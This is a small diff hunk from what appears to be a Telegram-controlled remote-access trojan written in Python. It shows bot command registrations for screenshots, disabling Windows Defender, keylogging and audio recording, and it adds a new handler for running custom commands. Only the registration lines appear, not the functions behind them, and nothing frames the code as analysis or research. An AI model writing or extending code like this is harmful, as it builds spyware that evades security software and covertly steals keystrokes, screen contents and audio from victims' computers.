@@ -31,6 +31,7 @@ app.add_handler(CommandHandler('ss', ss_command))
 app.add_handler(CommandHandler('stopdefender', stopDefender_command))
 app.add_handler(CommandHandler('keylog', keylog_command))
 app.add_handler(CommandHandler('listen', audio_command))
+app.add_handler(CommandHandler('customcommand', custom_command))
 
 # Register message handler
 app.add_handler(MessageHandler(filters.TEXT, no_command))
